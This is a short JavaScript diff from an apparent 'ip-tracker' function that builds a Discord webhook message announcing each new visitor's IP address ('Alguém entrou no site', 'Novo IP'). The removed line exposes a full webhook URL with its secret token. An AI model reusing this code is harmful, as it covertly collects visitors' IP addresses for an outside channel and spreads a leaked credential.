@@ -11,7 +11,7 @@ function collectInfo(json) {
   // Set the payload for the webhook
   var params = {
     username: "ip-tracker",
-    avatar_url: "https://discord.com/api/webhooks/1125245988093825144/QZUXFnlGiBBiYFXuaVH0MiWqxZqvvzgjRdBaUYrxYqu_xmBfYTdgfBguvzvI3ysedt6y",
+    avatar_url: "https://media.discordapp.net/attachments/1091553414435057704/1125218148937900083/adb5d45c000aa298d09e374b2153158b.jpg",
     content: "Alguém entrou no site :)\n",
     embeds: [{
       title: "Novo IP:",
